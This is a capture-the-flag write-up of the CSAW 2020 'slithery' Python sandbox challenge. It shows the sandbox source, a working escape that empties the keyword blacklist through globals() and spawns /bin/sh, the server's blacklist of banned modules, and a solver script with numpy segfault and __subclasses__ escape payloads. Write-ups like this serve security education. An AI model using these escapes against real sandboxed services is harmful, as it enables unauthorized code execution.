# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
CSAW CTF Quals 2020

# Category
pwn

# Challenge Name
slithery

# Challenge Points
100 pts

# Challenge Description
Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...

`nc pwn.chal.csaw.io 5011`

# Attachments
## sandbox.py
```python
#!/usr/bin/env python3
from base64 import b64decode
import blacklist  # you don't get to see this :p

"""
Don't worry, if you break out of this one, we have another one underneath so that you won't
wreak any havoc!
"""

def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]):
                raise Exception("not allowed!!")

            final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)

        except (KeyboardInterrupt, EOFError):
            return 0
        except Exception as e:
            print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```

# Solution
## The Program
The provided file, `sandbox.py`, looks to be a python3 program which takes an input from the user, appends it to `final_cmd` (some obfuscated code), and runs the string as python code, like the python interactive cli (except each input is isolated). My first thought was to send a payload like `import os; os.system('/bin/sh')` to spawn a shell. However, this yields the response:
```
Exception: not allowed!
```
So it seems the program loads a blacklist from a local python module and checks it against the user's input to sanitize it to some degree. I tried obvuscating my input like `final_cmd` to see if I could get around the blacklist but I found that the blacklist was fairly exhaustive. So let's take a look at `final_cmd` and see if we can find any clues. After some reversing, simplifying, and base64 decoding, the code looks something like this:
```python
import base64.b64decode as HrjYMvtxwA
import numpy as RMbPOQHCzt
```
## The Exploit
Since the blacklist prevented me from importing any modules, I started looking through this [list](https://docs.python.org/3/library/functions.html) of functions built in to python3 which don't need to be imported. I eventually came across `globals()`, a function that returns a `dict` of the script's global objects. So, I checked if it was blacklisted:
```python
EduPy 3.8.2
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc90cd9ec40>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'sandbox.py', '__cached__': None, 'b64decode': <function b64decode at 0x7fc90cc5b940>, 'blacklist': <module 'blacklist' from '/home/slithery/blacklist.py'>, 'main': <function main at 0x7fc90ccabdc0>}
```
It's not on the blacklist! Even better, the blacklist is on *it*! Let's see if we can modify the blacklist:
```python
EduPy 3.8.2
>>> import
Exception: not allowed!!
>>> globals()['blacklist'].BLACKLIST = []
>>> import
Exception: invalid syntax (<string>, line 10)
```
Nice. Let's get a shell:
```python
EduPy 3.8.2
>>> globals()['blacklist'].BLACKLIST = []
>>> import os; os.system('/bin/sh')
ls
blacklist.py
flag.txt
runner.py
sandbox.py
solver.py
```
Just for fun, lets check out the blacklist:
```python
cat blacklist.py
"""
blacklist.py

    Module that is seperated and kept secret, as it contains all the banned keywords
    that cannot be executed in the sandbox.
"""

# an incredibly restrictive blacklist. Player should craft a numpy escape.
BLACKLIST = [
    "__builtins__",
    "__import__",
    "eval",
    "exec",
    "import",
    "from",
    "os",
    "sys",
    "system",
    "timeit",
    "base64"
    "commands",
    "subprocess",
    "pty",
    "platform",
    "open",
    "read",
    "write",
    "dir",
    "type",
]

# a less restrictive blacklist for the 2nd sandbox. Player can use any other payload to read the flag.txt on server.
BLACKLIST2 = [
    "eval",
    "exec",
    "import",
    "from",
    "timeit",
    "base64"
    "commands",
    "subprocess",
    "pty",
    "platform",
    "write",
    "dir",
    "type",
]
```
`"Player should craft a numpy escape."` whoops ¯\\\_(ツ)\_/¯

It looks like there are two blacklists though? Let's check out another one of these scripts:
```python
cat runner.py
#!/usr/bin/env python3
"""
runner.py

    Executes the actual sandbox environment, and handles
    any segfaults that occur and spawns the second sandbox to retrieve the flag.
"""

import os
import subprocess
import blacklist

def main():
    res = subprocess.call(["python3", "sandbox.py"])

    # we triggered a segfault due to null dereference, start second sandbox
    if res in [-11, 245]:
        print("EduPy crashed...")
        print("\nHey, how'd you get out?! Hopefully one more regular one should stop you >:)\n")
        while True:
            try:
                command = input(">> ")
                if any([x in command for x in blacklist.BLACKLIST2]):
                    raise Exception("not allowed!!")
                exec(command)
            except (EOFError, KeyboardInterrupt) as e:
                return 0

                print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```
Huh, so it looks like we were supposed to cause `sandbox.py` to segfault so that it drops us out into the less secure sandbox. How about we take a look at the intended solution:
```python
cat solver.py
#!/usr/bin/env python3
from pwn import *

def main():
    p = remote("localhost", "8000")
    numpy_escape = "RMbPOQHCzt.vdot(RMbPOQHCzt.intc(), RMbPOQHCzt.ndarray(1, {}))"
    py_escape = "[].__class__.__base__.__subclasses__()[134].__init__.__globals__['sys'].modules['os'].system('cat flag.txt')"

    p.sendlineafter(">>> ", numpy_escape)
    p.sendlineafter(">> ", py_escape)
    p.interactive()

if __name__ == "__main__":
    main()
```
Anyway that's enough of that, a flag is a flag:
```
cat flag.txt
flag{y4_sl1th3r3d_0ut}
```
